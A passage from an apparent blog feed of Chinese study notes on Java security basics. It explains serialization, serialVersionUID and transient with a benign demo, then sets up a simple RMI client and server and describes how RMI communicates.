class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@Builder</span></span><br><span class="line"><span class="meta">@ToString</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RpcRequest</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1905122041950251207L</span>;</span><br><span class="line">    <span class="keyword">private</span> String requestId;</span><br><span class="line">    <span class="keyword">private</span> String interfaceName;</span><br><span class="line">    <span class="keyword">private</span> String methodName;</span><br><span class="line">    <span class="keyword">private</span> Object[] parameters;</span><br><span class="line">    <span class="keyword">private</span> Class&lt;?&gt;[] paramTypes;</span><br><span class="line">    <span class="keyword">private</span> RpcMessageTypeEnum rpcMessageTypeEnum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="serialVersionUID的作用"><a href="#serialVersionUID的作用" class="headerlink" title="serialVersionUID的作用"></a>serialVersionUID的作用</h3><ol><li>Q: serialVersionUID 有什么作用？</li><li>A: 序列化号 serialVersionUID 属于版本控制的作用。反序列化时，<strong>会检查 serialVersionUID 是否和当前类的 serialVersionUID 一致</strong>。如果 serialVersionUID 不一致则会抛出 InvalidClassException 异常。强烈推荐每个序列化类都手动指定其 serialVersionUID，如果不手动指定，那么编译器会动态生成默认的 serialVersionUID。</li><li><em><strong>serialVersionUID的生成</strong></em><ol><li>大多数现代IDE（如 IntelliJ IDEA、Eclipse）都提供了自动生成 serialVersionUID 的功能。生成的 serialVersionUID <strong>通常是基于类的结构计算出来的</strong>，确保每次类结构变化时，生成的 serialVersionUID 也会不同</li></ol></li></ol><h3 id="补充问题-为什么静态变量serialVersionUID可以被序列化？"><a href="#补充问题-为什么静态变量serialVersionUID可以被序列化？" class="headerlink" title="补充问题: 为什么静态变量serialVersionUID可以被序列化？"></a>补充问题: 为什么静态变量serialVersionUID可以被序列化？</h3><ol><li><a href="https://github.com/Snailclimb/JavaGuide/issues/2174">stack exchange解答</a></li><li>static 修饰的变量是静态变量，属于类而非类的实例，本身是不会被序列化的。然而，serialVersionUID 是一个特例，serialVersionUID 的序列化做了特殊处理。当一个对象被序列化时，serialVersionUID 会被写入到序列化的二进制流中；在反序列化时，也会解析它并做一致性判断，以此来验证序列化对象的版本一致性。如果两者不匹配，反序列化过程将抛出 InvalidClassException，因为这通常意味着序列化的类的定义已经发生了更改，可能不再兼容 –&gt; <em><strong>总结: 因为它就是特殊处理的，目的就是为了保证类的匹配</strong></em></li><li><em><strong>关于transient</strong></em><ol><li>对于不想进行序列化的变量，可以使用 transient 关键字修饰。 –&gt; transient 关键字的作用是：阻止实例中那些用此关键字修饰的的变量序列化；当对象被反序列化时，被 transient 修饰的变量值不会被持久化和恢复</li><li>关于 transient 还有几点注意<ol><li>transient 只能修饰变量，不能修饰类和方法</li><li>transient 修饰的变量，在反序列化后变量值将会被置成<strong>类型的默认值</strong> –&gt; 例如，如果是修饰 int 类型，那么反序列后结果就是 0</li><li><strong>static变量</strong>因为不属于任何对象(Object)，所以无论有没有 transient 关键字修饰，均不会被序列化</li></ol></li></ol></li></ol><h2 id="如何使用jdk的序列化"><a href="#如何使用jdk的序列化" class="headerlink" title="如何使用jdk的序列化"></a>如何使用jdk的序列化</h2><h3 id="Serializable接口"><a href="#Serializable接口" class="headerlink" title="Serializable接口"></a>Serializable接口</h3><ol><li>java.io.Serializable是一个<strong>空的接口</strong>*(Marker Interface)，我们不需要实现java.io.Serializable的任何方法</li><li>java.io.Serializable接口仅仅只用于标识这个类可序列化。实现了java.io.Serializable接口的类原则上都需要生产一个serialVersionUID常量，反序列化时如果双方的serialVersionUID不一致会导致InvalidClassException 异常</li><li>以下是jdk7u21的源码及部分注释如下</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Classes that require special handling during the serialization and</span></span><br><span class="line"><span class="comment"> * deserialization process must implement special methods with these exact</span></span><br><span class="line"><span class="comment"> * signatures:</span></span><br><span class="line"><span class="comment"> *  要进行序列化和反序列化的类必须  自己  实现以下的方法</span></span><br><span class="line"><span class="comment"> * &lt;PRE&gt;</span></span><br><span class="line"><span class="comment"> * private void writeObject(java.io.ObjectOutputStream out)</span></span><br><span class="line"><span class="comment"> *     throws IOException</span></span><br><span class="line"><span class="comment"> * private void readObject(java.io.ObjectInputStream in)</span></span><br><span class="line"><span class="comment"> *     throws IOException, ClassNotFoundException;</span></span><br><span class="line"><span class="comment"> * private void readObjectNoData()</span></span><br><span class="line"><span class="comment"> *     throws ObjectStreamException;</span></span><br><span class="line"><span class="comment"> * &lt;/PRE&gt;</span></span><br><span class="line"><span class="comment"> * ...</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>  unascribed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.ObjectOutputStream</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.ObjectInputStream</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.ObjectOutput</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.ObjectInput</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.io.Externalizable</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>   JDK1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ObjectInputStream"><a href="#ObjectInputStream" class="headerlink" title="ObjectInputStream"></a>ObjectInputStream</h3><ol><li>java.io.ObjectInputStream类最核心的功能是readObject方法，即反序列化类对象<ol><li>除了能读取基本类型和String类型外，调用readObject()可以直接返回一个Object对象。要把它变成一个特定类型，<strong>必须强制转型</strong>(因为返回的是Object对象)</li></ol></li></ol><h3 id="ObjectOutputStream"><a href="#ObjectOutputStream" class="headerlink" title="ObjectOutputStream"></a>ObjectOutputStream</h3><ol><li>java.io.ObjectOutputStream类最核心的方法是writeObject方法，即序列化类对象<ol><li><em><strong>Serializable接口的作用: ObjectOutputStream既可以写入基本类型，也可以写入实现了Serializable接口的Object</strong></em></li></ol></li></ol><h3 id="ObjectInputStream和ObjectOutputStream示例"><a href="#ObjectInputStream和ObjectOutputStream示例" class="headerlink" title="*ObjectInputStream和ObjectOutputStream示例"></a>*ObjectInputStream和ObjectOutputStream示例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ObjectxxxSteam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String email;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/* * * * * * 搞出一个对象 * * * * * */</span></span><br><span class="line">            <span class="type">DeserializationTest</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DeserializationTest</span>();</span><br><span class="line">            t.name = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">            t.email = <span class="string">&quot;abc@apt&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * *  * * * ObjectOutputStream写出内存: 序列化 * * * * * */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 字节数组输出流：ByteArrayOutputStream 是一个输出流，用于将数据写入内存中的字节数组</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="comment">// 对象与数据类型输出流：ObjectOutputStream 是一个用于写入对象和基本数据类型的输出流</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            <span class="comment">// Object输出流的关闭和缓冲需要进行注意</span></span><br><span class="line">            oos.writeObject(t);</span><br><span class="line">            oos.close();</span><br><span class="line">            oos.flush();</span><br><span class="line">            System.out.println(<span class="string">&quot;DeserializationTest序列化后端字节数组&quot;</span> + Arrays.toString(baos.toByteArray()));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * ObjectInputSream写入内存:反序列化 * * * * * */</span></span><br><span class="line">            <span class="comment">// 原理和输出流类似的</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 字节数组输入流：需要接受一个别的输出，而输出流每一次创建都是新的</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="comment">// 对象输入流</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            <span class="type">DeserializationTest</span> <span class="variable">newT</span> <span class="operator">=</span> (DeserializationTest) ois.readObject();</span><br><span class="line">            System.out.println(<span class="string">&quot;用户名: &quot;</span> + newT.name + <span class="string">&quot; 邮箱: &quot;</span> + newT.email);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 指向不同的对象 * * * * * */</span></span><br><span class="line">            System.out.println(t);</span><br><span class="line">            System.out.println(newT);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li><a href="https://javaguide.cn/java/basis/serialization.html#jdk-%E8%87%AA%E5%B8%A6%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E6%96%B9%E5%BC%8F">jdk-自带的序列化方式与serialVersionUID</a></li><li>补充参考，比较细节，还没看完<ol><li><a href="https://www.zhihu.com/question/37562657/answer/1916596031">知乎讨论区</a></li><li><a href="https://cryin.github.io/blog/secure-development-java-deserialization-vulnerability/">应用安全:JAVA反序列化漏洞之殇</a></li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全4_RMI</title>
      <link href="/2024/11/13/Java%E5%AE%89%E5%85%A84_RMI/"/>
      <url>/2024/11/13/Java%E5%AE%89%E5%85%A84_RMI/</url>
      
        <content type="html"><![CDATA[<h2 id="引入RMI-Remote-Method-Invocation"><a href="#引入RMI-Remote-Method-Invocation" class="headerlink" title="引入RMI(Remote Method Invocation)"></a>引入RMI(Remote Method Invocation)</h2><blockquote><p>RMI严重依赖序列化和反序列化<br>使用RMI时，双方必须是内网互相信任的机器，不要把1099端口暴露在公网上作为对外服务<br>Java的RMI调用机制决定了双方必须是Java程序，其他语言很难调用Java的RMI。如果要使用不同语言进行RPC调用，可以选择更通用的协议，例如gRPC</p></blockquote><ol><li>Java远程方法调用，RMI用于构建分布式应用程序，RMI实现了Java程序之间跨JVM的远程通信：<strong>实现了方法调用和对象实体的独立</strong>，一个JVM中的代码可以通过网络实现远程调用另一个JVM的某个方法 –&gt; <strong>RMI的方法执行是再服务端上进行的，只是将结果返回给客户端并且可以有客户端进行调用</strong></li><li>RMI是Java独有的一种机制</li></ol><h2 id="二话不说先手搓熟悉一下"><a href="#二话不说先手搓熟悉一下" class="headerlink" title="二话不说先手搓熟悉一下"></a>二话不说先手搓熟悉一下</h2><blockquote><p>大体先理解一下然后再进入细节</p></blockquote><ol><li>实现注意事项<ol><li>客户端只需要查找服务并获得接口实例，服务器端只需要编写实现类并注册为服务</li><li><em><strong>接口</strong></em>: <strong>服务端和客户端中的接口类必须一样</strong>，客户端只要有接口类就可以，对象是从远程服务端进行加载的，与此同时，<strong>接口必须必须派生自java.rmi.Remote，并在每个方法声明抛出RemoteException</strong>，客户端提供接口并进行远程调用</li><li><em><strong>服务端</strong></em>: 服务端需要将对应服务类的实例<strong>注册到rmi服务中</strong>(对应就是<code>Naming.bind(RMI_SERVER_NAME, new RMITest());</code>)，这里注册的是实例而不是类</li><li>Index<ol><li>RMIClientTest</li><li>RMIServerTest</li></ol></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RMIClientTest</span></span><br><span class="line">    <span class="comment">// 本来客户端也要有IRMITest这个接口，但是在本机不能冲突</span></span><br><span class="line">    <span class="comment">// 如果冲突会报错: </span></span><br><span class="line">    <span class="comment">// java.lang.ClassCastException: com.sun.proxy.$Proxy0 cannot be cast to RMI.RMIClient.IRMITest at RMI.RMIClient.RMIClientTest.main(RMIClientTest.java:13)</span></span><br><span class="line">    <span class="comment">// 解决方法详见https://stackoverflow.com/questions/54848952/java-rmi-class-com-sun-proxy-proxy0-cannot-be-cast-to-class-client-messageserve</span></span><br><span class="line"><span class="keyword">package</span> RMI.RMIClient;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> RMI.RMIServer.IRMITest;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClientTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">RMI_SERVER_NAME</span> <span class="operator">=</span> <span class="string">&quot;rmi://192.168.193.126:7777/Test&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">IRMITest</span> <span class="variable">test</span> <span class="operator">=</span> (IRMITest) Naming.lookup(RMI_SERVER_NAME);</span><br><span class="line">            <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> test.test();</span><br><span class="line">            System.out.println(res);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RMIServerTest</span></span><br><span class="line"><span class="comment">// 1. IRMITest</span></span><br><span class="line"><span class="keyword">package</span> RMI.RMIServer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * RMI测试接口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRMITest</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * RMI测试方法</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回字符串</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    String <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. RMITest</span></span><br><span class="line"><span class="keyword">package</span> RMI.RMIServer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMITest</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IRMITest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RMITest</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * RMI测试方法实现</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回测试字符串</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello RMI&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. RMIServerTest</span></span><br><span class="line"><span class="keyword">package</span> RMI.RMIServer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">RMI_HOST</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">RMI_PORT</span> <span class="operator">=</span> <span class="number">7777</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">RMI_SERVER_NAME</span> <span class="operator">=</span> <span class="string">&quot;rmi://&quot;</span> + RMI_HOST + <span class="string">&quot;:&quot;</span> + RMI_PORT + <span class="string">&quot;/Test&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// System.setProperty(&quot;java.rmi.server.hostname&quot;, RMI_HOST);</span></span><br><span class="line">            LocateRegistry.createRegistry(RMI_PORT);</span><br><span class="line">            Naming.bind(RMI_SERVER_NAME, <span class="keyword">new</span> <span class="title class_">RMITest</span>());</span><br><span class="line">            System.out.println(<span class="string">&quot;RMI服务启动成功，服务地址: &quot;</span> + RMI_SERVER_NAME);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RMI通信过程与本质"><a href="#RMI通信过程与本质" class="headerlink" title="RMI通信过程与本质"></a>RMI通信过程与本质</h2><h3 id="从宏观理解方面的通信过程"><a href="#从宏观理解方面的通信过程" class="headerlink" title="从宏观理解方面的通信过程"></a>从宏观理解方面的通信过程</h3><ol><li>先运行服务器，再运行客户端，服务端提供服务，客户端获得的接口方法返回值(实际上是通过网络从服务器端获取的)</li><li>客户端持有的WorldClock接口实际上对应了一个“实现类”，它是由Registry内部动态生成的，并负责把方法调用通过网络传递到服务器端，客户端的“实现类”称为stub</li><li>服务器端接收网络调用的服务并不是我们自己编写的WorldClockService，而是Registry自动生成的代码，服务器端的网络服务类称为skeleton，它会真正调用服务器端的WorldClockService</li><li>获取结果，然后把结果通过网络传递给客户端</li><li>整个过程由RMI底层负责实现序列化和反序列化</li><li><img src="/pic/Java%E5%AE%89%E5%85%A84_RMI/MACRO_Flow.png" alt="图示"></li></ol><h3 id="深入一点"><a href="#深入一点" class="headerlink" title="深入一点"></a>深入一点</h3><ol><li><p><img src="/pic/Java%E5%AE%89%E5%85%A84_RMI/DEEPER_Flow.png" alt="上图片"></p></li><li><p>根据p牛的java安全漫谈再次进行分析</p><blockquote><p>p牛原文<br>第⼀次建立TCP连接是连接远端 192.168.135.142 的1099端⼝，这也是我们在代码⾥里里看到的端⼝，二者进行沟通后，我向远端发送了了⼀一个“Call”消息，远端回复了了一“ReturnData”消息，然后我新建了一个TCP连接，连到远端的33769端⼝<br>在“ReturnData”这个包中，返回了目标的IP地址 192.168.135.142 ，其后跟的一个字节 \x00\x00\x83\xE9 ，刚好就是整数 33769 的⽹网络序列<br>首先客户端连接Registry，并在其中寻找Name是Hello的对象，这个对应数据流中的Call消息；然后Registry返回一个序列列化的数据，这个就是找到的Name&#x3D;Hello的对象，这个对应数据流中的ReturnData消息；客户端反序列化该对象，发现该对象是一个远程对象，地址在 192.168.135.142:33769 ，于是再与这个地址建立TCP连接；在这个新的连接中，才执行真正远程方法调⽤用，也就是 hello()</p></blockquote></li><li><p>此处进行了<em><strong>两次tcp握手</strong></em></p><ol><li><strong>第一次握手</strong>是传输RemoteCall对象，含方法调用的所有必要信息，如方法名、参数等</li><li><strong>第二次握手</strong>是通过远程对象的引用来调用远程方法并从服务端返回方法执行结果</li></ol></li></ol><blockquote><ol><li>客户端: RMI客户端在调用远程方法时会先创建Stub(sun.rmi.registry.RegistryImpl_Stub)</li><li>客户端: Stub会将Remote对象传递给远程引用层(java.rmi.server.RemoteRef)并创建java.rmi.server.RemoteCall(远程调用)对象</li><li>客户端: RemoteCall序列化RMI服务名称、Remote对象</li><li>客户端到服务端: RMI客户端的远程引用层传输RemoteCall序列化后的请求信息通过Socket连接的方式传输到RMI服务端的远程引用层</li><li>服务端: RMI服务端的远程引用层(sun.rmi.server.UnicastServerRef)收到请求会请求传递给Skeleton(sun.rmi.registry.RegistryImpl_Skel#dispatch)</li><li>服务端: Skeleton调用RemoteCall反序列化RMI客户端传过来的序列化</li><li>服务端到客户端: Skeleton处理客户端请求：bind、list、lookup、rebind、unbind，如果是lookup则查找RMI服务名绑定的接口对象，序列化该对象并通过RemoteCall传输到客户端</li><li>客户端: RMI客户端反序列化服务端结果，获取远程对象的引用</li><li>客户端到服务端: RMI客户端调用远程方法，RMI服务端反射调用RMI服务实现类的对应方法并序列化执行结果返回给客户端。</li><li>服务端到客户端: RMI客户端反序列化RMI远程方法调用结果</li></ol></blockquote><h2 id="Q-A"><a href="#Q-A" class="headerlink" title="*Q&amp;A"></a>*Q&amp;A</h2><h3 id="Regiser是什么？"><a href="#Regiser是什么？" class="headerlink" title="Regiser是什么？"></a>Regiser是什么？</h3><ol><li>RMIRegistry就像一个网关，他自己是不会执行远程方法的，但RMI Server可以在上面注册一个Name到对象的绑定关系；RMI Client;通过Name向RMIRegistry查询，得到这个绑定关系，然后再连接RMIServer;最后，远程方法实际上在RMIServer上调用</li><li>再结合《深入一点》就能差不多理解了</li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>javasec</li><li>java安全漫谈</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全3(1)_类加载器详解</title>
      <link href="/2024/11/13/Java%E5%AE%89%E5%85%A83(1)_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E8%AF%A6%E8%A7%A3/"/>
      <url>/2024/11/13/Java%E5%AE%89%E5%85%A83(1)_%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E8%AF%A6%E8%A7%A3/</url>
      
